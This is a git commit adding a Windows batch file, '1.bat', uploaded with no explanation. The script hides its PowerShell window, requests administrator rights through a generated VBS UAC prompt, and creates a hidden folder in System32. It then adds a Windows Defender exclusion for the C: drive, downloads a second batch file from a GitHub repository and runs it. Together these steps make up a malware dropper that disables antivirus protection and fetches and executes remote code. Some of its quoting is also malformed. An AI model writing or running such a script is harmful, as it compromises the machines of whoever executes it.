7b7750c44620f6f1a2d4ca75ddb991048a9feb50
ThisNot7 <169090350+ThisNot7@users.noreply.github.com>
2025-07-24 16:53:26 +0300

    Add files via upload

---
+++ 1.bat
@@ -0,0 +1,36 @@
+ÿþ
+@echo off
+
+powershell -window hidden -command ""
+    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
+>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
+) ELSE (
+>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+)
+
+if '%errorlevel%' NEQ '0' (
+    goto UACPrompt
+) else ( goto gotAdmin )
+
+:UACPrompt
+    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+    set params= %*
+    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs
+
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+    exit /B
+
+:gotAdmin
+    pushd "%CD%"
+    CD /D "%~dp0"
+
+cd "C:\Windows\System32"
+mkdir "Services"
+attrib +h "Services" /s /d
+
+powershell.exe -command "Add-MpPreference -ExclusionPath "C:\
+
+Powershell -Command "Invoke-Webrequest 'https://github.com/ThisNot7/test-security-defender/raw/main/2.bat' -OutFile C:\Windows\System32\Services\2.bat"
+cd C:\Windows\System32\Services"
+start 2.bat
